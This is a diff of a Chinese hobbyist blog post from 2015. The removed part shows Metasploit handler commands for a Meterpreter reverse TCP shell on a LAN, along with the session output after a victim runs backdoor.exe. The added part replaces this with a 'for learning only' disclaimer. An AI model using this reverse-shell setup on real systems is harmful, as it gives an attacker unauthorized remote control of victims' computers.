-<h4 id="上传backdoor-exe并获得shell"><a href="#上传backdoor-exe并获得shell" class="headerlink" title="上传backdoor.exe并获得shell"></a>上传backdoor.exe并获得shell</h4><p>直接上指令：<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$ msfconsole</div><div class="line">msf exploit(handler) &gt; set PAYLOAD windows/meterpreter/reverse_tcp</div><div class="line">PAYLOAD =&gt; windows/meterpreter/reverse_tcp</div><div class="line">msf exploit(handler) &gt; set LHOST 192.168.1.3</div><div class="line">LHOST =&gt; 192.168.1.3</div><div class="line">msf exploit(handler) &gt; set LPORT 4444</div><div class="line">LPORT =&gt; 4444</div><div class="line">msf exploit(handler) &gt; exploit</div></pre></td></tr></table></figure></p>
-<p>在Victim的计算机上双击backdoor.exe，顺利的话会这样：<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">[*] Started reverse handler on 192.168.1.3:4444</div><div class="line">[*] Starting the payload handler...</div><div class="line">[*] Sending stage (957486 bytes) to 192.168.1.3</div><div class="line">[*] Meterpreter session 1 opened (192.168.1.3:4444 -&gt; 192.168.1.3:54411) at 2015-11-08 22:07:07 +0800</div></pre></td></tr></table></figure></p>
-<p>然后输入shell尽情玩耍吧……<br>附上一张截图：<br><img src="http://ww4.sinaimg.cn/mw690/005WMcFzjw1exupqph2nvj313w0bxack.jpg" alt=""><br>由图可见我完全接管了Windows 7的shell，下面就可以随心所欲了23333</p>
-<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>对于linux来说，遇到错误真的就是Google，复制命令然后祈祷了。装什么东西都要搞一大堆依赖包，不过总体来说还是比较人性化，大多数时候终端会告诉你你需要装什么。Metasploit功能强大，最近在测试的只是基于LAN下的计算机，更深入的问题留作以后探讨。<br>最后用BackTrack Linux上的一句话来作结：</p>
-<blockquote>
-<p>The quieter you become,the more you are able to hear…</p>
-</blockquote>
-
-          
+          <ul>
+<li>还是写在文前：怎么说呢，折腾这个东西我的内心是很复杂的。一个美好的用来写模电和概率和大物的周日就这么没了ˊ_&gt;ˋ哎呀，可是人家就是这么执着的跳坑怎么破。还是和以往一样，这篇文章的相关技术仅供学习，千万不要做出一些危险出格的事情。
+          <div class="post-more-link text-center">
+            <a class="btn" href="/2015/11/08/2015-11-08-msf/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
         
       
     </div>
